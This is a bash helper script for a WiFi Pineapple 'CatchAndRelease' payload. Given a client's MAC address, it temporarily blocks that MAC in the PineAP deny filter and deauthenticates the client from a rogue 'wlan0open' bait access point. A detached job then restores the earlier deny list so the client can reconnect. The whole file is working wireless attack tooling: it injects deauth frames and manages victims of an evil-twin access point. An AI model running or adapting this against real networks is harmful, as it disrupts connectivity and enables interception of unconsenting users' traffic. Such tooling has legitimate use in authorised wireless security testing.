#!/bin/bash
# release.sh <mac> [block_secs] - "release" a client: block its MAC in the
# PineAP deny filter (so it can't instantly flap back onto the still-broadcast
# bait) and deauth it, then un-block after block_secs (default 15) so it can
# reconnect. Shared by the CatchAndRelease alert payload and its watcher.
#
# NOTE: PINEAPPLE_DEVICE_FILTER_DELETE is broken on this firmware, so the
# un-block uses PINEAPPLE_DEVICE_FILTER_CLEAR + re-add of the prior entries.

export PATH="/usr/bin:/bin:/usr/sbin:/sbin:${PATH:-}"

mac="$1"
secs="${2:-15}"
[ -n "$mac" ] && [ "$mac" != "unknown" ] || exit 1

command -v PINEAPPLE_DEAUTH_CLIENT >/dev/null 2>&1 || exit 1
bssid="$(timeout 3 iw dev wlan0open info 2>/dev/null | awk '/addr/{print $2; exit}')"
[ -n "$bssid" ] || bssid="$(hostapd_cli -i wlan0open status 2>/dev/null | awk -F= '/^bssid\[0\]/{print $2}')"
ch="$(timeout 3 iw dev wlan0open info 2>/dev/null | sed -n 's/.*channel \([0-9][0-9]*\).*/\1/p')"
[ -n "$bssid" ] && [ -n "$ch" ] || exit 1

# Snapshot existing deny entries so the temporary block doesn't wipe them.
prev="$(PINEAPPLE_DEVICE_FILTER_LIST deny 2>/dev/null \
    | grep -oiE '([0-9a-f]{2}:){5}[0-9a-f]{2}' \
    | grep -viE "^${mac}$" | tr '\n' ' ')"

command -v PINEAPPLE_DEVICE_FILTER_ADD >/dev/null 2>&1 && \
    PINEAPPLE_DEVICE_FILTER_ADD deny "$mac" >/dev/null 2>&1
PINEAPPLE_DEAUTH_CLIENT "$bssid" "$mac" "$ch" >/dev/null 2>&1

# Un-block after secs; detached (new session) so it survives callers exiting.
setsid sh -c "sleep $secs; PINEAPPLE_DEVICE_FILTER_CLEAR deny >/dev/null 2>&1; for m in $prev; do PINEAPPLE_DEVICE_FILTER_ADD deny \$m >/dev/null 2>&1; done" \
    >/dev/null 2>&1 </dev/null &

exit 0
